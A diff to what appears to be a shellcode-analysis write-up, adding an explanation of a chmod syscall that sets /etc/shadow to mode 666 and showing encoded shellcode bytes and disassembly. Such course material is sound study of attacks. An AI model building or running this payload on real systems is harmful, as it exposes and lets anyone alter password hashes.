@@ -75,9 +75,6 @@ print output
 ```
 
 #### Generating the Hex in the `0x ,` Format
-+ The `\<Return>` at the end was added after for formatting.
-  - This format does work when compiling shellcode with `nasm`.
-  - Nasm does not seem to care about `<space>` characters either.
 
 ```console
 root# python formatHex.py
@@ -88,6 +85,9 @@ Encoded shellcode ...
 0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
 0xcd,0x80
 ```
++ The `\<Return>` at the end was added after for formatting.
+  - This format does work when compiling shellcode with `nasm`.
+  - Nasm does not seem to care about `<space>` characters either.
 ### Adding the Shellcode to our `JMP|Call|POP` Assembly Program
 
 ```nasm
@@ -266,6 +266,43 @@ This block finishs setting up the registers
    0x08048087 <+28>:    pop    ecx
    0x08048088 <+29>:    int    0x80
 ```
+
+```c
+  int chmod(const char *path, mode_t mode);
+       EAX         EBX             ECX
+```
+Looking back at our C `chmod()` function, we know the following arguments are required:
++ `const char *path`
+  - This means the `EBX` register will be a pointer to the memory location holding our string `/etc/shadow`.
++ `mode_t mode`
+  - This meas the `ECX` register will hold the permissions we wish to change the file to.
+
+Consulting the manual pages with `man 2 chmod` we find the following for the `mode`.
+```console
+ The new file permissions are specified in mode, which is a bit mask  created  by  ORing
+       together zero or more of the following:
+       S_ISUID  (04000)  set-user-ID (set process effective user ID on execve(2))
+       S_ISGID  (02000)  set-group-ID  (set process effective group ID on execve(2); mandatory
+                         locking, as described in fcntl(2); take a new file's group from  par‐
+                         ent directory, as described in chown(2) and mkdir(2))
+       S_ISVTX  (01000)  sticky bit (restricted deletion flag, as described in unlink(2))
+       S_IRUSR  (00400)  read by owner
+       S_IWUSR  (00200)  write by owner
+       S_IXUSR  (00100)  execute/search  by owner ("search" applies for directories, and means
+                         that entries within the directory can be accessed)
+       S_IRGRP  (00040)  read by group
+       S_IWGRP  (00020)  write by group
+       S_IXGRP  (00010)  execute/search by group
+       S_IROTH  (00004)  read by others
+       S_IWOTH  (00002)  write by others
+       S_IXOTH  (00001)  execute/search by others
+```
+The istruction `push  0x1b6` and `pop ecx` are used to fufill the `mode` arguement.  
+Hex `1b6` translates to `666` in ocatal. This sets read(4) & write(2) permissions for user, group, and others.
+
+ The new file permissions are specified in mode, which is a bit mask  created  by  ORing
+       together zero or more of the following:
+
 
 ### exit Systemcall Section
 + Our second systemcall had the  hex value `0x1` in the `eax` register.
